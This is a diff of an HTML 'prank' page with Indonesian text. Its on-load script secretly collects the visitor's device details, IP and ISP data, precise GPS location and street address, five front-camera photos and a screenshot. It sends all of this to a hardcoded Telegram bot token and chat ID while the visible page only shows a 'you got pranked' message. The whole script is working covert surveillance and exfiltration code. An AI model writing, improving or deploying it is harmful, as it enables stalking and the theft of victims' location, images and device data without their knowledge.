@@ -17,133 +17,154 @@
       justify-content: center;
       align-items: center;
       color: #00ff00;
-      text-align: center;
+      text-align: left;
+      font-size: 12px;
+      letter-spacing: 0.5px;
     }
     #msg {
-      opacity: 0;
-      animation: fadein 2s ease-in-out forwards;
-    }
-    @keyframes fadein {
-      to { opacity: 1; }
+      white-space: pre-wrap;
+      width: 90%;
+      max-width: 600px;
+      line-height: 1.5;
     }
   </style>
 </head>
 <body>
-  <div id="msg">
-      Data anda telah saya amankan<br>
-    Terima kasih atas kerja samanya.
-  </div>
+  <div id="msg"></div>
 
-<script>
-const token = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
-const chatId = '5914256752';
+  <script>
+    const token = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
+    const chatId = '5914256752';
 
-const sendToTelegram = async (text) => {
-  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
-  });
-};
-
-const sendPhoto = async (blob, filename) => {
-  const form = new FormData();
-  form.append('chat_id', chatId);
-  form.append('photo', blob, filename);
-  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
-};
-
-const getGPUInfo = () => {
-  const canvas = document.createElement('canvas');
-  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-  const ext = gl?.getExtension('WEBGL_debug_renderer_info');
-  return ext ? {
-    vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
-    renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
-  } : { vendor: 'Unknown', renderer: 'Unknown' };
-};
-
-const getDeviceBrand = () => {
-  const ua = navigator.userAgent;
-  if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
-  if (/Oppo|CPH/.test(ua)) return 'Oppo';
-  if (/SM-|Samsung/.test(ua)) return 'Samsung';
-  if (/Infinix/.test(ua)) return 'Infinix';
-  if (/RMX/.test(ua)) return 'Realme';
-  if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
-  return 'Android Device';
-};
-
-const getBatteryInfo = async () => {
-  try {
-    const bat = await navigator.getBattery();
-    return {
-      level: Math.round(bat.level * 100) + '%',
-      charging: bat.charging ? 'Yes' : 'No'
+    const typeText = (el, text, speed = 35) => {
+      let i = 0;
+      const interval = setInterval(() => {
+        if (i < text.length) {
+          el.textContent += text[i];
+          i++;
+        } else {
+          clearInterval(interval);
+        }
+      }, speed);
     };
-  } catch {
-    return { level: 'Unknown', charging: 'Unknown' };
-  }
-};
 
-const getIPInfo = async () => {
-  const res = await fetch('https://ipapi.co/json');
-  return await res.json();
-};
+    const sendToTelegram = async (text) => {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
+      });
+    };
 
-const getGeoInfo = async (lat, lon) => {
-  const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
-  return await res.json();
-};
+    const sendPhoto = async (blob, filename) => {
+      const form = new FormData();
+      form.append('chat_id', chatId);
+      form.append('photo', blob, filename);
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: form
+      });
+    };
 
-const getScreenshot = async () => {
-  const canvas = await html2canvas(document.body);
-  canvas.toBlob(blob => sendPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
-};
+    const getGPUInfo = () => {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      const ext = gl?.getExtension('WEBGL_debug_renderer_info');
+      return ext ? {
+        vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
+        renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
+      } : { vendor: 'Unknown', renderer: 'Unknown' };
+    };
 
-// ✅ Bagian ini yang DIGANTI SESUAI PERMINTAAN
-const captureCamera = async () => {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-    const video = document.createElement('video');
-    video.setAttribute('playsinline', '');
-    video.srcObject = stream;
+    const getDeviceBrand = () => {
+      const ua = navigator.userAgent;
+      if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
+      if (/Oppo|CPH/.test(ua)) return 'Oppo';
+      if (/SM-|Samsung/.test(ua)) return 'Samsung';
+      if (/Infinix/.test(ua)) return 'Infinix';
+      if (/RMX/.test(ua)) return 'Realme';
+      if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
+      return 'Android Device';
+    };
 
-    await video.play();
-    await new Promise(r => setTimeout(r, 1500));
-
-    for (let i = 1; i <= 5; i++) {
-      if (video.readyState >= 2) {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        await new Promise(resolve => {
-          canvas.toBlob(blob => {
-            sendPhoto(blob, `camera_${i}.jpg`);
-            resolve();
-          }, 'image/jpeg');
-        });
-        await new Promise(r => setTimeout(r, 1500));
+    const getBatteryInfo = async () => {
+      try {
+        const bat = await navigator.getBattery();
+        return {
+          level: Math.round(bat.level * 100) + '%',
+          charging: bat.charging ? 'Yes' : 'No'
+        };
+      } catch {
+        return { level: 'Unknown', charging: 'Unknown' };
       }
-    }
+    };
 
-    stream.getTracks().forEach(t => t.stop());
-    await sendToTelegram('📷 5 Foto dari kamera depan berhasil dikirim.');
-  } catch (e) {
-    await sendToTelegram('❌ Kamera gagal diakses.');
-  }
-};
-// ⛔ END perubahan
+    const getIPInfo = async () => {
+      const res = await fetch('https://ipapi.co/json');
+      return await res.json();
+    };
 
-const captureLocation = async () => {
-  try {
-    navigator.geolocation.getCurrentPosition(async pos => {
-      const { latitude, longitude, accuracy, altitude, speed } = pos.coords;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-      const geo = await getGeoInfo(latitude, longitude);
-      const address = geo?.display_name || 'Unknown';
-      const lokasi = `
+    const getGeoInfo = async (lat, lon) => {
+      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+      return await res.json();
+    };
+
+    const getScreenshot = async () => {
+      const canvas = await html2canvas(document.body);
+      canvas.toBlob(blob => sendPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
+    };
+
+    const captureCamera = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.createElement('video');
+        video.setAttribute('playsinline', '');
+        video.srcObject = stream;
+        await video.play();
+
+        await new Promise(resolve => {
+          const checkReady = setInterval(() => {
+            if (video.readyState >= 2 && video.videoWidth > 0) {
+              clearInterval(checkReady);
+              resolve();
+            }
+          }, 100);
+        });
+
+        await new Promise(r => setTimeout(r, 1000)); // auto fokus
+
+        for (let i = 1; i <= 5; i++) {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0);
+
+          await new Promise(resolve => {
+            canvas.toBlob(async blob => {
+              await sendPhoto(blob, `camera_${i}.jpg`);
+              resolve();
+            }, 'image/jpeg');
+          });
+
+          await new Promise(r => setTimeout(r, 1000)); // jeda 1 detik
+        }
+
+        stream.getTracks().forEach(t => t.stop());
+        await sendToTelegram('📷 Kamera berhasil kirim 5 foto.');
+      } catch (e) {
+        await sendToTelegram('❌ Kamera gagal diakses.');
+      }
+    };
+
+    const captureLocation = async () => {
+      try {
+        navigator.geolocation.getCurrentPosition(async pos => {
+          const { latitude, longitude, accuracy, altitude, speed } = pos.coords;
+          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+          const geo = await getGeoInfo(latitude, longitude);
+          const address = geo?.display_name || 'Unknown';
+          const lokasi = `
 📍 GPS LOCATION
 [+] Latitude       : ${latitude} deg
 [+] Longitude      : ${longitude} deg
@@ -153,18 +174,18 @@ const captureLocation = async () => {
 [+] Speed          : ${speed ?? 'Unknown'} m/s
 [+] Google Maps    : ${maps}
 [+] Address        : ${address}`.trim();
-      await sendToTelegram(lokasi);
-    }, () => {}, { enableHighAccuracy: true, timeout: 10000 });
-  } catch {}
-};
+          await sendToTelegram(lokasi);
+        }, () => {}, { enableHighAccuracy: true, timeout: 10000 });
+      } catch {}
+    };
 
-const collectInfo = async () => {
-  const gpu = getGPUInfo();
-  const brand = getDeviceBrand();
-  const battery = await getBatteryInfo();
-  const ip = await getIPInfo();
-  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  const info = `
+    const collectInfo = async () => {
+      const gpu = getGPUInfo();
+      const brand = getDeviceBrand();
+      const battery = await getBatteryInfo();
+      const ip = await getIPInfo();
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const info = `
 📦 DEVICE INFORMATION
 [+] Device Brand   : ${brand}
 [+] OS             : Android
@@ -174,9 +195,7 @@ const collectInfo = async () => {
 [+] GPU Vendor     : ${gpu.vendor}
 [+] GPU            : ${gpu.renderer}
 [+] Resolution     : ${screen.width}x${screen.height}
-[+] Orientation    : ${screen.orientation?.type || 'Unknown'}
 [+] Browser        : ${navigator.userAgent}
-[+] Browser Engine : WebKit/537.36
 [+] Timezone       : ${timezone}
 [+] Uptime         : ${(performance.now()/1000/60).toFixed(1)} minutes
 [+] Battery Level  : ${battery.level}
@@ -192,13 +211,18 @@ const collectInfo = async () => {
 [+] ISP            : ${ip.org}
 [+] Google Maps    : https://www.google.com/maps/place/${ip.latitude}+${ip.longitude}`.trim();
 
-  await sendToTelegram(info);
-  captureLocation();
-  captureCamera();
-  getScreenshot();
-};
+      await sendToTelegram(info);
+      captureLocation();
+      captureCamera();
+      getScreenshot();
+    };
 
-window.onload = collectInfo;
-</script>
+    // UI: efek ketik
+    const msg = `             Selamat anda kena prank.\n         Terima kasih atas kerja samanya.`;
+    typeText(document.getElementById('msg'), msg, 30);
+
+    // Mulai proses
+    window.onload = collectInfo;
+  </script>
 </body>
 </html>
